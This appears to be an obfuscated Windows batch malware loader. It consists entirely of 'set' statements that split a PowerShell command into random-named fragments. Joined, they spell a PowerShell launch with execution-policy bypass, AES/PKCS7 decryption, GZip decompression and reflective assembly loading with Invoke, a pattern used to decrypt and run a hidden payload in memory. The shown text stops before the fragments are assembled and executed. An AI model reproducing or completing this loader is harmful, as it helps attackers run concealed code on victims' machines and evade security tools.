@echo off
set "XTfOBOHzTP=co"
set "DamIDaSFmU=do"
set "ryvkKCEDjk=ws"
set "zztsqMUDub=0\"
set "qTuGQNAeYm= /"
set "RoUGuMetzF=s\"
set "ftYIIOHalP=nd"
set "wphmbWtxkB=:\"
set "KoAGiGrFjp=32"
set "FeKrXQvzXT=rs"
set "gimfCLOQju= C"
set "POGrlTJFcN=we"
set "oxxoWydyfM=\W"
set "vkFdMNCPlw=he"
set "WREFsKTbhw=ll"
set "acRfIQzrnV=em"
set "qPSnFpOZfd=\v"
set "GuzJpdrzEn=Sy"
set "YZjQKDOLvs=he"
set "ztdSFXftqA=Wi"
set "IzTAFDCtay=in"
set "VeoDhkMeiU=py"
set "FTDIRtTKzw=ll"
set "otlvAIeFAZ=st"
set "FymlvjdIQd=rS"
set "aRpysGXcBk=ow"
set "gMjYFdNOai=1."
set "coBHwlIRwV=.e"
set "NalAnkuZbE=Po"
set "dXELLolPLV=we"
set "NIYraEjDFx=xe"
set "XtrBRgJYGA=y "
set "qsjtMjhWkv=po"
set "usrzHQXnOy=cd"
set "eIyrwIbQIh= %~dp0"
set "TZQTEyMYtj=onve"
set "VXICVCMcvA=yste"
set "DAiygXWZCQ=$Qzm"
set "hihwbfPvtZ=saBm"
set "VRstsZQeES=tion"
set "YyxdkepEgv=gMod"
set "JAyFUuegrW=);$a"
set "KfqUZvWGfo=)))"
set "bNdZZjgriq=Syst"
set "TQHInuDjND=flec"
set "kLUbOrEJrZ=);$a"
set "KqztmwFJYn=tH ="
set "YdbpSlcuiF=($sP"
set "NgqvoDWmaD=oint"
set "vQzBhPmQIx=gCP."
set "LJswqihBZo=lBlo"
set "LKaRHhqFyB= = $"
set "uzYOqXVDfE=se()"
set "ydPYRvOLgG=rt]:"
set "zrmljVahtD=H) {"
set "IUEYoZgnpP=oUn."
set "CLleGXYSDB=gTGF"
set "xhYZSGKliu=S46e"
set "pdFEwGpihg=X.Su"
set "AqlsXXiTNp=GF.I"
set "qkjADYLVEr=rity"
set "LCsanUzbTI=Fo7l"
set "CVXSpCGhoP=.Con"
set "SJCClKsUSx= '')"
set "sSjwmekHXN=6] -"
set "vFUUrXzrLr== [S"
set "pIQuALTBtp=zb);"
set "RqjiuEMniA=.Sec"
set "sXSGWPogMD=HB.D"
set "RyyeQUpnZB=.Cry"
set "uCEYdNqsHL=ke($"
set "JQPdUipuFN=-1.."
set "xwQOliDlbV=Syst"
set "KxNFMnbQqM=n ''"
set "tWrWVuMATA=esaB"
set "usyhfJNLrL=1] -"
set "lcfVjoOGwI=F.Pa"
set "cDAZbYURWj=ecry"
set "RNBQbIfwub=3); "
set "ZprixXGOoy=null"
set "JttMfExkoS=pose"
set "rzkrVyzDMB=, $K"
set "IzSlpOKuOV=ionM"
set "XMMRdTdJDi=YPzb"
set "ImtfraZaRY=PKCS"
set "OMdttneKlE=yste"
set "Xfiwtuowql=ment"
set "SYSEIlWSuv=b = "
set "EiwhqTmByt= [st"
set "smQDRlbQbM=rans"
set "INornVyQmV=ptog"
set "uIIanRamTL=Z = "
set "rAxdOBmFvX=);$h"
set "YasrUogDNc=ptor"
set "ktYYpLATtP=gTGF"
set "gQWEQMIWYs=tem."
set "TeCnuuCbuE=ew-O"
set "lOwTiqlYbS=ion."
set "TnlcYcXjvB=nirt"
set "xPFoOcdnwp=y.Pa"
set "NbmMLGqhkT=TllA"
set "mnFmuoOuAd= = N"
set "VcsoeaBZix=sPqD"
set "OZQQrOvTnX=stem"
set "pYPKjAoMBi=Comp"
set "pwESBqjGbR=.Cop"
set "ifekaQStPN=g = "
set "fcMhCWOUyL='dqR"
set "WzGzuxHIJg=WxK "
set "jSWtwiJjZB=ect "
set "pNFFtDuumL=$Qzm"
set "oUuTcbzmmy=y.Cr"
set "OyhHctPlcu=($sP"
set "WaqDfHTAMK=ct S"
set "hYyAAniNsU=)) {"
set "YiSToWeFZs=)($K"
set "itMyktayeN=xgCP"
set "zIyLKVVEBx=Lq);"
set "ZqqddSrfPm=bypa"
set "DhoXlhZhsG=Comp"
set "tBxUQWVpgs=hy.A"
set "oweAKqdpIq=-ep "
set "RixrbwCqfx=brea"
set "bxuXqACulV==');"
set "sBmTrhRHWZ=and "
set "EMGxyqdAmI=yTo("
set "OXltWDSCmC=oin "
set "SbtMsvxDmA=in $"
set "xiKaSpuWdK=le  "
set "XxBVfXGkbb=isfL"
set "wgZgzxWTMk=KYPz"
set "DBAoUetcWs=gnir"
set "ejedoSbILW=7Yiv"
set "BqMqvlSbtJ=O.Me"
set "edcluVWxdF=m.Re"
set "pesnwhRHwm=rtS4"
set "aRgWVnhOzr=oArr"
set "KfKNzurDMG=gTGF"
set "wFEfrwOsSQ=agTG"
set "jBPYBSQWSO=();$"
set "WEDxYPDAHm=V = "
set "xSSeXXJpXx= if "
set "fWQinoHgVM=Disp"
set "AAxGjUxsnI=BC;$"
set "PlWPUvEPDm=Stre"
set "pToOAzTEHr=zb ="
set "PUXGlXNOma=ress"
set "UBIqstNKnq=VugJ"
set "vYwDWDvkua=ewLi"
set "RpXrVTZwxq=.Dis"
set "sgWtymKwAy=ne);"
set "opNVtTZdpZ=Disp"
set "CkiogFDxse=stem"
set "OBZMWKZiJC=[Sys"
set "gwcjVRrSsN=)($z"
set "OXdAFTdXuh=ZYYc"
set "KgWDgXTVTV=oUn "
set "cdDJToZpcK=Obje"
set "VFqHYqfZgY=m.IO"
set "cDCKOnvFJr=eam("
set "FkoCLdDZzo=join"
set "rSWPFWmHdp= [Sy"
set "OPhkTHjDsz=..-1"
set "wTIMShuTwC=m(, "
set "upjJdKmRMB=Star"
set "YKSEIfYUUt=Secu"
set "SiUXSDCcBX=m.IO"
set "wVWPoMWJaA=; };"
